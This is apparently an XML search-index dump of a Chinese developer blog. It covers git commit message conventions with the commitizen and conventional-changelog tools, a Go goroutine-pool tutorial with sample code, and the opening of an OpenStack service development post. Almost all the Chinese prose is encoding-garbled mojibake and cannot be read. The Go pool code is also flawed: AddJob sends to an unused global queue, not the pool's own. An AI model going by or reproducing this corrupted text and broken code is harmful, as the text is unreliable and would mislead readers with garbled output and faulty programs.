å¯ä»¥çœç•¥ã€‚ä¸ç®¡æ˜¯å“ªä¸€ä¸ªéƒ¨åˆ†ï¼Œä»»ä½•ä¸€è¡Œéƒ½ä¸å¾—è¶…è¿‡72ä¸ªå­—ç¬¦ï¼ˆæˆ–100ä¸ªå­—ç¬¦ï¼‰ã€‚è¿™æ˜¯ä¸ºäº†é¿å…è‡ªåŠ¨æ¢è¡Œå½±å“ç¾Žè§‚ã€‚ HeaderHeaderéƒ¨åˆ†åªæœ‰ä¸€è¡Œï¼ŒåŒ…æ‹¬ä¸‰ä¸ªå­—æ®µï¼štypeï¼ˆå¿…éœ€ï¼‰ã€scopeï¼ˆå¯é€‰ï¼‰å’Œsubjectï¼ˆå¿…éœ€ï¼‰ã€‚ typeç”¨äºŽè¯´æ˜Žcommitçš„ç±»åˆ«ï¼Œåªå…è®¸ä½¿ç”¨ä¸‹é¢7ä¸ªæ ‡è¯† featï¼šæ–°åŠŸèƒ½ï¼ˆfeatureï¼‰ fixï¼šä¿®è¡¥bug docsï¼šæ–‡æ¡£ï¼ˆdocumentationï¼‰ styleï¼š æ ¼å¼ï¼ˆä¸å½±å“ä»£ç è¿è¡Œçš„å˜åŠ¨ï¼‰ refactorï¼šé‡æž„ï¼ˆå³ä¸æ˜¯æ–°å¢žåŠŸèƒ½ï¼Œä¹Ÿä¸æ˜¯ä¿®æ”¹bugçš„ä»£ç å˜åŠ¨ï¼‰ testï¼šå¢žåŠ æµ‹è¯• choreï¼šæž„å»ºè¿‡ç¨‹æˆ–è¾…åŠ©å·¥å…·çš„å˜åŠ¨ å¦‚æžœtypeä¸ºfeatå’Œfixï¼Œåˆ™è¯¥commitå°†è‚¯å®šå‡ºçŽ°åœ¨Change logä¹‹ä¸­ã€‚å…¶ä»–æƒ…å†µï¼ˆdocsã€choreã€styleã€refactorã€testï¼‰ç”±ä½ å†³å®šï¼Œè¦ä¸è¦æ”¾å…¥Change logï¼Œå»ºè®®æ˜¯ä¸è¦ã€‚ scopescopeç”¨äºŽè¯´æ˜Ž commit å½±å“çš„èŒƒå›´ï¼Œæ¯”å¦‚æ•°æ®å±‚ã€æŽ§åˆ¶å±‚ã€è§†å›¾å±‚ç­‰ç­‰ï¼Œè§†é¡¹ç›®ä¸åŒè€Œä¸åŒ subjectsubjectæ˜¯ commit ç›®çš„çš„ç®€çŸ­æè¿°ï¼Œä¸è¶…è¿‡50ä¸ªå­—ç¬¦ã€‚ ä»¥åŠ¨è¯å¼€å¤´ï¼Œä½¿ç”¨ç¬¬ä¸€äººç§°çŽ°åœ¨æ—¶ï¼Œæ¯”å¦‚changeï¼Œè€Œä¸æ˜¯changedæˆ–changes ç¬¬ä¸€ä¸ªå­—æ¯å°å†™ ç»“å°¾ä¸åŠ å¥å·ï¼ˆ.ï¼‰ BodyBody éƒ¨åˆ†æ˜¯å¯¹æœ¬æ¬¡ commit çš„è¯¦ç»†æè¿°ï¼Œå¯ä»¥åˆ†æˆå¤šè¡Œã€‚ä½†æ˜¯æœ‰ä¸¤ä¸ªæ³¨æ„ç‚¹ã€‚ ä½¿ç”¨ç¬¬ä¸€äººç§°çŽ°åœ¨æ—¶ï¼Œæ¯”å¦‚ä½¿ç”¨changeè€Œä¸æ˜¯changedæˆ–changesã€‚ åº”è¯¥è¯´æ˜Žä»£ç å˜åŠ¨çš„åŠ¨æœºï¼Œä»¥åŠä¸Žä»¥å‰è¡Œä¸ºçš„å¯¹æ¯”ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªangularé¡¹ç›®ä¸‹é¢çš„ä¸€ä¸ªèŒƒä¾‹ã€‚1234567891011Protractor users were having a problem where if they had asynchonous code in a`route.resolve` or `route.resolveRedirectTo` variable, Protractor was notwaiting for that code to complete before continuing. Seeangular/protractor#789 (comment) fordetails.This commit fixes it by ensuring that `$browser#outstandingRequestCount` isproperly increased/decreased while `$route` (asynchronously) processes a route.Also, enhanced `ngMock` to wait for pending requests, before calling callbacksfrom `$browser.notifyWhenNoOutstandingRequests()`. Footerè¯¥éƒ¨åˆ†ä¸»è¦æ˜¯ç”¨äºŽå˜æ›´è¿‡ä¼šçš„ä¸€äº›åŽç»­æ“ä½œçš„, æ¯”å¦‚å…³é—­issue, æ’¤é”€ä¹‹å‰çš„commitç­‰ å…³é—­Issueå¦‚æžœå½“å‰ commit é’ˆå¯¹æŸä¸ªissueï¼Œé‚£ä¹ˆå¯ä»¥åœ¨ Footer éƒ¨åˆ†å…³é—­è¿™ä¸ª issue ã€‚ä¹Ÿå¯ä»¥ä¸€æ¬¡å…³é—­å¤šä¸ªissue 1Closes #112 1Closes #221, 222, 223 æ’¤é”€ä¹‹å‰çš„commitå¦‚æžœå½“å‰ commit ç”¨äºŽæ’¤é”€ä»¥å‰çš„ commitï¼Œåˆ™å¿…é¡»ä»¥revert:å¼€å¤´ï¼ŒåŽé¢è·Ÿç€è¢«æ’¤é”€ Commit çš„ Headerã€‚Bodyéƒ¨åˆ†çš„æ ¼å¼æ˜¯å›ºå®šçš„ï¼Œå¿…é¡»å†™æˆThis reverts commit hash.ï¼Œå…¶ä¸­çš„hashæ˜¯è¢«æ’¤é”€ commit çš„ SHA æ ‡è¯†ç¬¦ã€‚å¦‚æžœå½“å‰ commit ä¸Žè¢«æ’¤é”€çš„ commitï¼Œåœ¨åŒä¸€ä¸ªå‘å¸ƒï¼ˆreleaseï¼‰é‡Œé¢ï¼Œé‚£ä¹ˆå®ƒä»¬éƒ½ä¸ä¼šå‡ºçŽ°åœ¨ Change log é‡Œé¢ã€‚å¦‚æžœä¸¤è€…åœ¨ä¸åŒçš„å‘å¸ƒï¼Œé‚£ä¹ˆå½“å‰ commitï¼Œä¼šå‡ºçŽ°åœ¨ Change log çš„Revertså°æ ‡é¢˜ä¸‹é¢ã€‚123revert: feat(pencil): add 'graphiteWidth' optionThis reverts commit 667ecc1654a317a13331b17617d973392f415f02. ä¸å…¼å®¹å˜åŠ¨å¦‚æžœå½“å‰ä»£ç ä¸Žä¸Šä¸€ä¸ªç‰ˆæœ¬ä¸å…¼å®¹ï¼Œåˆ™ Footer éƒ¨åˆ†ä»¥BREAKING CHANGEå¼€å¤´ï¼ŒåŽé¢æ˜¯å¯¹å˜åŠ¨çš„æè¿°ã€ä»¥åŠå˜åŠ¨ç†ç”±å’Œè¿ç§»æ–¹æ³•ã€‚1234567891011121314151617BREAKING CHANGE: isolate scope bindings definition has changed. To migrate the code follow the example below: Before: scope: &#123; myAttr: 'attribute', &#125; After: scope: &#123; myAttr: '@', &#125; The removed `inject` wasn't generaly useful for directives so there should be no code using it. å·¥å…·åŸºäºŽcommit messageæœ‰ä¸°å¯Œçš„å·¥å…·ï¼ŒåŒ…æ‹¬ç¼–è¾‘å™¨ï¼Œæ ¡éªŒå·¥å…·ï¼Œä»¥åŠç”ŸæˆChange logçš„å·¥å…· Commitizenç¼–è¾‘å·¥å…·Commitizenæ˜¯ä¸€ä¸ªæ’°å†™åˆæ ¼ Commit message çš„å·¥å…·, è¯¦ç»†è¯´æ˜Žgithubåœ°å€ å®‰è£…1) å…¨å±€å®‰è£…(è®°å¾—ä½¿ç”¨æ·˜å®æºæ¥åŠ é€Ÿ)123âžœ ~ npm install -g commitizenâžœ ~ npm install -g cz-conventional-changelogecho '&#123; "path": "cz-conventional-changelog" &#125;' &gt; ~/.czrc 2ï¼‰å±€éƒ¨å®‰è£…12âžœ ~ npm install commitizen -gâžœ ~ commitizen init cz-conventional-changelog --save-dev --save-exact ä¸»è¦å¦‚æžœæŠ¥package.jsonä¸å­˜åœ¨,éœ€è¦æ·»åŠ è¿™ä¸ªæ–‡ä»¶, è¿™æ˜¯nodejsçš„åŒ…ç®¡ç†æ–‡ä»¶, æ ¼å¼å¯ä»¥å‚æ•°commitizenåŒ…çš„package.json ä½¿ç”¨123456789101112131415âžœ device git:(master) âœ— git czcz-cli@2.9.5, cz-conventional-changelog@1.2.0Line 1 will be cropped at 100 characters. All other lines will be wrapped after 100 characters.? Select the type of change that you're committing: (Use arrow keys)â¯ feat: A new feature fix: A bug fix docs: Documentation only changes style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc) refactor: A code change that neither fixes a bug nor adds a feature perf: A code change that improves performance test: Adding missing tests or correcting existing tests(Move up and down to reveal more choices) validate-commit-msgæ ¡éªŒå·¥å…·validate-commit-msg ç”¨äºŽæ£€æŸ¥ Node é¡¹ç›®çš„ Commit message æ˜¯å¦ç¬¦åˆæ ¼å¼ã€‚æˆ‘æš‚æ—¶ä¸éœ€è¦,githubåœ°å€ ç”ŸæˆChange logçš„å·¥å…·conventional-changelog å°±æ˜¯ç”Ÿæˆ Change log çš„å·¥å…·ï¼Œè¿è¡Œä¸‹é¢çš„å‘½ä»¤å³å¯ã€‚githubåœ°å€123$ npm install -g conventional-changelog-cli$ cd my-project$ conventional-changelog -p angular -i CHANGELOG.md -s ä¸Šé¢å‘½ä»¤ä¸ä¼šè¦†ç›–ä»¥å‰çš„ Change logï¼Œåªä¼šåœ¨CHANGELOG.mdçš„å¤´éƒ¨åŠ ä¸Šè‡ªä»Žä¸Šæ¬¡å‘å¸ƒä»¥æ¥çš„å˜åŠ¨ã€‚å¦‚æžœä½ æƒ³ç”Ÿæˆæ‰€æœ‰å‘å¸ƒçš„ Change logï¼Œè¦æ”¹ä¸ºè¿è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚1$ conventional-changelog -p angular -i CHANGELOG.md -w -r 0 ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ï¼Œå¯ä»¥å°†å…¶å†™å…¥package.jsonçš„scriptså­—æ®µã€‚1234&#123; "scripts": &#123; "changelog": "conventional-changelog -p angular -i CHANGELOG.md -w -r 0" &#125;&#125; ä»¥åŽï¼Œç›´æŽ¥è¿è¡Œä¸‹é¢çš„å‘½ä»¤å³å¯ã€‚1$ npm run changelog]]></content>
      <categories>
        <category>å¼€å‘å·¥å…·</category>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Golangå¹¶å‘ç¼–ç¨‹-åç¨‹æ± ]]></title>
    <url>%2F2017%2F01%2F12%2Fgoroutine-pool%2F</url>
    <content type="text"><![CDATA[åœ¨æœ€è¿‘å¼€å‘çš„é¡¹ç›®ä¸­ï¼ŒåŽç«¯éœ€è¦ç¼–å†™è®¸å¤šæä¾›HTTPæŽ¥å£çš„APIï¼Œä¹‹æ‰€ä»¥é€‰æ‹©Golangï¼Œä¸»è¦æ˜¯è€ƒè™‘åˆ°å¼€å‘çš„æ¨¡å—ï¼Œéƒ½éœ€è¦æŽ¥å—çž¬æ—¶å¤§å¹¶å‘ã€ã€CPUå¯†é›†åž‹çš„åˆ†æžä»»åŠ¡ã€å¤„ç†æ—¶é—´è¾ƒé•¿ã€æ— æ³•åŒæ­¥ç«‹å³è¿”å›žç»“æžœçš„åœºæ™¯ï¼ŒGolangçš„goroutineä»¥åŠchannelæ‰€æä¾›çš„è¯­è¨€å±‚çº§çš„ç‰¹æ€§ï¼Œæ­£å¥½å¯ä»¥æ»¡è¶³è¿™æ–¹é¢çš„éœ€è¦ å¦‚ä½•é«˜å¹¶å‘å¹¶å‘æ¨¡å¼ä¸‹æœ‰å¾ˆå¤šé—®é¢˜éœ€è¦æˆ‘ä»¬å…³æ³¨, å› æ­¤æˆ‘ä»¬è®¾è®¡å‡ºæ¥çš„goroutine poolåº”è¯¥å…³æ³¨å¦‚ä¸‹ä¸€äº›é—®é¢˜ goroutineçš„é«˜å¹¶å‘goroutineçš„ä¸€ä¸ªä¸»è¦ç‰¹æ€§å°±æ˜¯å®ƒä»¬çš„æ¶ˆè€—ï¼›åˆ›å»ºå®ƒä»¬çš„åˆå§‹å†…å­˜æˆæœ¬å¾ˆä½Ž(ä¸Žéœ€è¦1è‡³8MBå†…å­˜çš„ä¼ ç»ŸPOSIXçº¿ç¨‹å½¢æˆé²œæ˜Žå¯¹æ¯”)ä»¥åŠæ ¹æ®éœ€è¦åŠ¨æ€å¢žé•¿å’Œç¼©å‡å ç”¨çš„èµ„æºã€‚è¿™ä½¿å¾—goroutineä¼šä»Ž4096å­—èŠ‚çš„åˆå§‹æ ˆå†…å­˜å ç”¨å¼€å§‹æŒ‰éœ€å¢žé•¿æˆ–ç¼©å‡å†…å­˜å ç”¨, åœ¨ä¸€èˆ¬çš„éœ€æ±‚ä¸‹, æˆ‘ä»¬æ— éœ€æ‹…å¿ƒèµ„æºçš„è€—å°½ã€‚ Goè¯­è¨€é€šè¿‡ç³»ç»Ÿçš„çº¿ç¨‹æ¥å¤šè·¯æ´¾é£è¿™äº›å‡½æ•°çš„æ‰§è¡Œï¼Œä½¿å¾—æ¯ä¸ªç”¨goå…³é”®å­—æ‰§è¡Œçš„å‡½æ•°å¯ä»¥è¿è¡Œæˆä¸ºä¸€ä¸ªå•ä½åç¨‹ã€‚å½“ä¸€ä¸ªåç¨‹é˜»å¡žçš„æ—¶å€™ï¼Œè°ƒåº¦å™¨å°±ä¼šè‡ªåŠ¨æŠŠå…¶ä»–åç¨‹å®‰æŽ’åˆ°å¦å¤–çš„çº¿ç¨‹ä¸­åŽ»æ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°äº†ç¨‹åºæ— ç­‰å¾…å¹¶è¡ŒåŒ–è¿è¡Œã€‚è€Œä¸”è°ƒåº¦çš„å¼€é”€éžå¸¸å°ï¼Œä¸€é¢—CPUè°ƒåº¦çš„è§„æ¨¡ä¸ä¸‹äºŽæ¯ç§’ç™¾ä¸‡æ¬¡ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿåˆ›å»ºå¤§é‡çš„goroutineï¼Œä»Žè€Œå¯ä»¥å¾ˆè½»æ¾åœ°ç¼–å†™é«˜å¹¶å‘ç¨‹åºï¼Œè¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®çš„ ç®€å•æ¥è¯´ï¼šåç¨‹ååˆ†è½»é‡ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­æ‰§è¡Œæœ‰æ•°ä»¥åä¸‡è®¡çš„åç¨‹ï¼Œä¾æ—§ä¿æŒé«˜æ€§èƒ½ã€‚ å› æ­¤æˆ‘ä»¬ä½¿ç”¨goroutineå¤„ç†ä»»åŠ¡, å¤§æ¦‚æ¨¡åž‹ä¸ºï¼š1234567891011121314151617package mainimport ( "fmt" "time")func say(s string) &#123; fmt.Println(s)&#125;func main() &#123; for _, word := range []string&#123;"hello", "world", "this", "is", "my", "goroutine", "test"&#125; &#123; go say(word) //å¼€ä¸€ä¸ªæ–°çš„Goroutinesæ‰§è¡Œ &#125; time.Sleep(time.Second * 1) // ç­‰å¾…goroutineè·‘å®Œ, æˆ‘ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨äº†sleepçš„æ–¹å¼&#125; åˆ©ç”¨ååºæ± åšå¹¶å‘æŽ§åˆ¶è™½ç„¶goroutineå¾ˆä¾¿å®œ, ä½†ä¹Ÿä¸æ˜¯å…è´¹çš„, æ€»æœ‰ä¸€ä¸ªæ—¶å€™ä½ ç³»ç»Ÿä¼šæ‰›ä¸ä½ï¼Œæˆ‘ä»¬ä¸èƒ½å¤©çœŸçš„å¯¹goroutineçš„æ•°é‡ä¸åŠ é™åˆ¶çš„ä½¿ç”¨, å› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ç§å¹¶å‘çš„é™åˆ¶æœºåˆ¶æ¥ä¿è¯ç¨‹åºçš„ç¨³å®š, ä½¿å¾—ç¨‹åºä¸ä¼šå› ä¸ºè¿‡å¤šçš„goroutineè€Œå´©æºƒ, è‡³äºŽå¤šå°‘ä¸ªgoroutine å°±éœ€è¦æ ¹æ®è‡ªå·±çŽ¯å¢ƒæµ‹è¯•å¾—å‡ºã€‚ å¦‚ä½•å¯¹goroutineåšå¹¶å‘é™åˆ¶å–ƒï¼Ÿä½¿ç”¨Javaå’ŒCæ¦‚å¿µä¸­çš„çº¿ç¨‹æ± æ¥å¤„ç†æ˜¯ä¸ªä¸é”™çš„æ–¹æ³•ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨Channelå®žçŽ°Queue+Workeræ¨¡åž‹, æ•´ä¸ªè¿‡ç¨‹ï¼šå°†è¯·æ±‚éƒ½è½¬å‘ç»™ä¸€ä¸ªchannelï¼Œç„¶åŽåˆå§‹åŒ–å¤šä¸ªgoroutineè¯»å–è¿™ä¸ªchannelä¸­çš„å†…å®¹ï¼Œå¹¶è¿›è¡Œå¤„ é¿å…æŽ¥æ”¶Channelé˜»å¡žå¦‚æžœchannelåˆå§‹åŒ–æ—¶æ˜¯æ²¡æœ‰è®¾ç½®é•¿åº¦çš„ï¼Œæ­¤æ—¶å¦‚æžœååºæ± éƒ½æ»¡è´Ÿè·å·¥ä½œï¼Œå†æœ‰è¯·æ±‚è¿‡æ¥çš„è¯ï¼Œä»ç„¶ä¼šå‡ºçŽ°è¢«blockçš„æƒ…å†µï¼Œè€Œä¸”ä¼šæ¯”æ²¡æœ‰ç»è¿‡ä¼˜åŒ–çš„æ–¹æ¡ˆè¿˜è¦æ…¢ é‡åˆ°è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬åº”è¯¥å¸Œæœ›æ¨¡å—èƒ½å¤ŸåŠæ—¶å‘ŠçŸ¥è°ƒç”¨æ–¹ï¼Œâ€œæˆ‘å·²ç»è¾¾åˆ°å¤„ç†æžé™äº†ï¼Œæ— æ³•ç»™ä½ å¤„ç†è¯·æ±‚äº†â€ã€‚å…¶å®žï¼Œè¿™ç§éœ€æ±‚ï¼Œå¯ä»¥å¾ˆç®€å•çš„åœ¨Golangä¸­å®žçŽ°ï¼šå¦‚æžœchannelå‘é€ä»¥åŠæŽ¥æ”¶æ“ä½œåœ¨selectè¯­å¥ä¸­æ‰§è¡Œå¹¶ä¸”å‘ç”Ÿé˜»å¡žï¼Œdefaultè¯­å¥å°±ä¼šç«‹å³æ‰§è¡Œã€‚ æŽ¥æ”¶æ‰§è¡Œç»“æžœæˆ‘ä»¬æ—¢éœ€è¦æŠŠç»“æžœå‘é€ç»™æŸä¸ªchannelï¼ŒèŽ·å–åˆ°å¤„ç†è¿™æ¬¡è¯·æ±‚çš„ç»“æžœã€‚è§£å†³çš„æ–¹æ³•æ˜¯ï¼šå°†ä¸€ä¸ªchannelå®žä¾‹åŒ…å«åœ¨è¯·æ±‚ä¸­ï¼Œgoroutineå¤„ç†å®ŒæˆåŽå°†ç»“æžœå†™å›žè¿™ä¸ªchannel ä»»åŠ¡è¶…æ—¶æœºåˆ¶å³ä½¿æ˜¯å¤æ‚ã€è€—æ—¶çš„ä»»åŠ¡ï¼Œä¹Ÿå¿…é¡»è®¾ç½®è¶…æ—¶æ—¶é—´ã€‚ä¸€æ–¹é¢å¯èƒ½æ˜¯ä¸šåŠ¡å¯¹æ­¤æœ‰æ—¶é™è¦æ±‚ï¼ˆç”¨æˆ·å¿…é¡»åœ¨XXåˆ†é’Ÿå†…çœ‹åˆ°ç»“æžœï¼‰ï¼Œå¦ä¸€æ–¹é¢æ¨¡å—æœ¬èº«ä¹Ÿä¸èƒ½éƒ½æ¶ˆè€—åœ¨ä¸€ç›´æ— æ³•ç»“æŸçš„ä»»åŠ¡ä¸Šï¼Œä½¿å¾—å…¶ä»–è¯·æ±‚æ— æ³•å¾—åˆ°æ­£å¸¸å¤„ç†ã€‚å› æ­¤ï¼Œä¹Ÿéœ€è¦å¯¹å¤„ç†æµç¨‹å¢žåŠ è¶…æ—¶æœºåˆ¶ã€‚ æˆ‘ä¸€èˆ¬è®¾ç½®è¶…æ—¶çš„æ–¹æ¡ˆæ˜¯ï¼šå’Œä¹‹å‰æåˆ°çš„â€œæŽ¥æ”¶å‘é€ç»™channelä¹‹åŽè¿”å›žçš„ç»“æžœâ€ç»“åˆèµ·æ¥ï¼Œåœ¨ç­‰å¾…è¿”å›žchannelçš„å¤–å±‚æ·»åŠ selectï¼Œå¹¶åœ¨å…¶ä¸­é€šè¿‡time.After()æ¥åˆ¤æ–­è¶…æ—¶ åç¨‹çš„ä¼˜é›…é€€å‡ºååºæ± é‡Œé¢çš„ååºæˆ‘ä»¬ä¹Ÿéœ€è¦ä¼˜é›…é€€å‡ºï¼Œè§£å†³æ–¹æ³•å¾ˆç®€å•, ç›´æŽ¥é€šè¿‡selectç›‘å¬ä¸€ä¸ªé€€å‡ºchannel, ç­‰å¾…å¤–éƒ¨é€šçŸ¥, å¥½ç»ˆæ­¢åç¨‹ å®žçŽ°åç¨‹æ± æŽ¥ä¸‹é‡Œæˆ‘ä»¬å°†å®žçŽ°ä¸€ä¸ªæ»¡è¶³ä¸Šè¿°éœ€æ±‚çš„Goroutine pool æµç¨‹å›¾ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129package mainimport "os"var ( // MaxWorker is the number of goroutine worker to start MaxWorker = os.Getenv("MAX_WORKERS") // MaxQueue is the job Queue buffered lenth MaxQueue = os.Getenv("MAX_QUEUE") // JobQueue is a buffered channel that we can send work requests on. JobQueue chan Job // WorkerPool is a pool of workers that are instantianted to perform the work WorkerPool chan chan Job)// Job represents the job to be runtype Job struct &#123; ID int task func()&#125;// Worker represents the worker that executes the jobtype Worker struct &#123; ID int InputQueue chan Job OutputQueue chan Result QuitQueue chan bool WorkerPool chan chan Job&#125;// Result use to collect the task resulttype Result struct &#123; JobID int Data interface&#123;&#125; Err error&#125;// GoroutinePool is a pool of workers channels that are registered with the GoroutinePooltype GoroutinePool struct &#123; maxWorkers int maxQueue int JobQueue chan Job ResultQueue chan Result WorkerPool chan chan Job&#125;// NewWorker is factory function to new a workerfunc NewWorker(id int, workerPool chan chan Job) *Worker &#123; worker := Worker&#123; ID: id, InputQueue: make(chan Job), OutputQueue: make(chan Result), WorkerPool: workerPool, QuitQueue: make(chan bool), &#125; return &amp;worker&#125;// Start method starts the run loop for the worker, listening for a quit channel// in case we need to stop itfunc (w Worker) Start() &#123; go func() &#123; for &#123; // register the current worker into the worker queue. w.WorkerPool &lt;- w.InputQueue select &#123; // we have received a work request case job := &lt;-w.InputQueue: job.task() // we have received a signal to stop case &lt;-w.QuitQueue: return &#125; &#125; &#125;()&#125;// Stop signals the worker to stop listening for work requests.func (w Worker) Stop() &#123; go func() &#123; w.QuitQueue &lt;- true &#125;()&#125;// NewGoroutinePool is a factory function to new a GoroutinePoolfunc NewGoroutinePool(maxWorkers int, maxQueue int) *GoroutinePool &#123; return &amp;GoroutinePool&#123; WorkerPool: make(chan chan Job, maxWorkers), JobQueue: make(chan Job, maxQueue), ResultQueue: make(chan Result, maxQueue), maxWorkers: maxWorkers, maxQueue: maxQueue, &#125;&#125;// dispatch use to dispatch the jobfunc (d *GoroutinePool) dispatch() &#123; for &#123; select &#123; case job := &lt;-d.JobQueue: // a job request has benn received go func(job Job) &#123; // try to obtain a worker job channel that is available. // this will block until a worker is idle jobChan := &lt;-d.WorkerPool // dispatch the job to the worker jobChan jobChan &lt;- job &#125;(job) &#125; &#125;&#125;// Run use to starting n number os workersfunc (d *GoroutinePool) Run() &#123; for i := 0; i &lt; d.maxWorkers; i++ &#123; worker := NewWorker(i+1, d.WorkerPool) worker.Start() &#125; go d.dispatch()&#125;// AddJob is a method to add job to job channelfunc (d *GoroutinePool) AddJob(job Job) (msg string, err error) &#123; JobQueue &lt;- job return "add a job to Job queue", nil&#125; æµ‹è¯•]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>goroutine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚ä½•å¼€å‘OpenstackæœåŠ¡-å¼€ç¯‡(ä¸€)]]></title>
    <url>%2F2017%2F01%2F10%2Fdevelop-openstack-service%2F</url>
    <content type="text"><![CDATA[openstackæ˜¯æˆ‘è§è¿‡æœ€å¤§æœ€å¤æ‚çš„pythoné¡¹ç›®, è™½ç„¶openstacké¡¹ç›®çš„çƒ­åº¦åœ¨ä¸‹æ»‘, ä½†æ˜¯openstackè¿™å¥—å¼€å‘ç†å¿µä»»ç„¶æ˜¯ç›¸å½“ä¸é”™çš„ï¼Œå€¼å¾—æˆ‘ä»¬å­¦ä¹ . ç”±äºŽå·¥ä½œéœ€è¦, æˆ‘ä¹Ÿéœ€è¦å¼€å‘ä¸€äº›è‡ªå®šä¹‰çš„openstackæœåŠ¡, å› æ­¤æƒ³å°†å¼€å‘openstackæœåŠ¡çš„è¿‡ç¨‹ä»¥ä¸€ç³»åˆ—çš„æ–‡ç« è®°å½•ä¸‹æ¥, æ–¹ä¾¿éœ€è¦çš„äººã€‚ openstackç®€ä»‹openstackæ˜¯ä¸€ä¸ªIaaSå¹³å°, æä¾›è®¡ç®—æœåŠ¡ã€ç½‘ç»œæœåŠ¡ã€å­˜å‚¨æœåŠ¡ç­‰, æœ‰3ç§æ–¹å¼ä½¿ç”¨openstackæä¾›çš„æœåŠ¡ APIé€šè¿‡APIä½¿ç”¨OpenStackçš„æ–¹å¼æ˜¯ç”±å„ä¸ªæœåŠ¡è‡ªå·±å®žçŽ°çš„, è¿™äº›APIéƒ½æ˜¯æœ‰ç»Ÿä¸€çš„å½¢å¼çš„ï¼Œéƒ½æ˜¯é‡‡ç”¨äº†HTTPåè®®å®žçŽ°çš„ç¬¦åˆRESTè§„èŒƒçš„APIã€‚ CLI/SDKé€šè¿‡å‘½ä»¤è¡Œæ˜¯ç”¨OpenStackæœåŠ¡çš„æ–¹å¼æ˜¯ç”±ä¸€ç³»åˆ—é¡¹ç›®æ¥æä¾›çš„ï¼Œè¿™äº›é¡¹ç›®ä¸€èˆ¬éƒ½å‘½åä¸ºpython-projectclientï¼Œæ¯”å¦‚python-keystoneclientï¼Œpython-novaclietnç­‰ã€‚è¿™äº›å‘½ä»¤è¡Œé¡¹ç›®åˆ†åˆ«å¯¹åº”åˆ°å„ä¸ªä¸»è¦çš„æœåŠ¡ï¼Œä¸ºç”¨æˆ·æä¾›å‘½ä»¤è¡Œæ“ä½œç•Œé¢å’ŒPythonçš„SDKã€‚æ¯”å¦‚python-keystoneclientå¯¹åº”åˆ°keystoneï¼Œä¸ºç”¨æˆ·æä¾›äº†keystoneè¿™ä¸ªå‘½ä»¤ï¼ŒåŒæ—¶ä¹Ÿæä¾›äº†keystoné¡¹ç›®çš„SDKï¼ˆå…¶å®žæ˜¯åœ¨SDKçš„åŸºç¡€ä¸Šå®žçŽ°äº†å‘½ä»¤è¡Œï¼‰ã€‚è¿™äº›clienté¡¹ç›®æä¾›çš„SDKå…¶å®žä¹Ÿæ˜¯å°è£…äº†å¯¹å„è‡ªæœåŠ¡çš„APIçš„è°ƒç”¨ã€‚ç”±äºŽæ¯ä¸ªä¸»è¦é¡¹ç›®éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç¤¾åŒºè§‰å¾—ä¸å¥½ï¼ŒäºŽæ˜¯åˆæœ‰äº†ä¸€ä¸ªæ–°çš„é¡¹ç›®python-openstackclientï¼Œç”¨æ¥æä¾›ä¸€ä¸ªç»Ÿä¸€çš„å‘½ä»¤è¡Œå·¥å…·openstackï¼ˆå‘½ä»¤çš„åå­—å°±å«åšopenstackï¼‰ï¼Œè¿™ä¸ªå·¥å…·å®žçŽ°äº†å‘½ä»¤è¡Œï¼Œç„¶åŽä½¿ç”¨å„ä¸ªæœåŠ¡çš„clienté¡¹ç›®æä¾›çš„SDKæ¥å®Œæˆå¯¹åº”çš„æ“ä½œ WebUIé€šè¿‡Webç•Œé¢ä½¿ç”¨OpenStackæœåŠ¡è¿™ç§æ–¹å¼æ˜¯é€šè¿‡OpenStackçš„Horizoné¡¹ç›®æä¾›çš„ã€‚Horizoné¡¹ç›®æ˜¯ä¸€ä¸ªDjangoåº”ç”¨ï¼Œå®žçŽ°äº†ä¸€ä¸ªé¢æ¿åŠŸèƒ½ï¼Œæ˜¯ä¼ ç»Ÿçš„MVCå¼€å‘æ¨¡åž‹, ä¸è¿‡æœ€æ–°çš„é¡¹ç›® åœ¨æ…¢æ…¢å¾€Angularä¸Šè¿ç§»ã€‚Horizoné¡¹ç›®ä¸»è¦æ˜¯æä¾›ä¸€ç§äº¤äº’ç•Œé¢ï¼Œå®ƒä¼šé€šè¿‡APIæ¥å’Œå„ä¸ªOpenStackæœåŠ¡è¿›è¡Œäº¤äº’ï¼Œç„¶åŽåœ¨Webç•Œé¢ä¸Šå±•ç¤ºå„ä¸ªæœåŠ¡çš„çŠ¶æ€ï¼›å®ƒä¹Ÿä¼šæŽ¥æ”¶ç”¨æˆ·çš„æ“ä½œï¼Œç„¶åŽè°ƒç”¨å„ä¸ªæœåŠ¡çš„APIæ¥å®Œæˆç”¨æˆ·å¯¹å„ä¸ªæœåŠ¡çš„ä½¿ç”¨ å› æ­¤å¼€å‘ä¸€ä¸ªå®Œæ•´çš„openstacké¡¹ç›®éœ€è¦å®Œæˆä¸Šé¢ä»‹ç»çš„3éƒ¨åˆ†çš„å¼€å‘ï¼Œå½“ç„¶APIæœåŠ¡æ˜¯æ ¹æœ¬ã€‚ openstackæž¶æž„æ•´ä¸ªopenstackçš„æœåŠ¡æ˜¯ä»¥æ’ä»¶åŒ–å¾—æ–¹å¼è¿›è¡Œç‹¬ç«‹å¼€å‘, ç„¶åŽé€šè¿‡APIç›¸äº’å…³è”, 